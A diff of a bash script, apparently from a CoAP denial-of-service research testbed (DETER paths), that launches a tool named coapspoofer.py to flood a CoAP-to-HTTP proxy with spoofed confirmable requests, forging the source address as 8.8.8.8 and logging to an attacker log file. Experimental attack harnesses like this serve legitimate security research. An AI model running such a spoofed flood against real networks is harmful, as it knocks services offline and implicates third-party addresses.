@@ -1,28 +1,23 @@
-#!/bin/bash
 
-source ./config.sh
+. /proj/MIT-DoS/exp/coap-setup/deps/californium/deter/scripts/config.sh
 
-proxy_ip=$1
+rm -f $TMP_DATA/$ATTACKER_LOGNAME
+touch $TMP_DATA/$ATTACKER_LOGNAME
 
-origin_ip=$2
+my_ip="8.8.8.8"
 
-my_ip=$3
-if [[ -z $my_ip ]]; then
-	my_ip=`hostname -I | awk '{ printf $1 }'`
-fi
-
-sudo python3 $BIN_HOME/coapspoofer.py \
+python3 $DETER_HOME/coapspoofer.py \
   --debug \
   --source $my_ip \
   --src-port 7123 \
-  --destination $proxy_ip \
+  --destination $PROXY_IP \
   --dst-port 5683 \
   --message-type CON \
   --code 001 \
-  --uri-host $proxy_ip \
+  --uri-host $PROXY_IP \
   --uri-path coap2http \
-  --proxy-uri http://$origin_ip:8000 \
-  --flood True &
+  --proxy-uri http://$ORIGIN_SERVER_IP:8000 \
+  --flood True > $TMP_DATA/$ATTACKER_LOGNAME
 
 spoofer_pid=$!
 
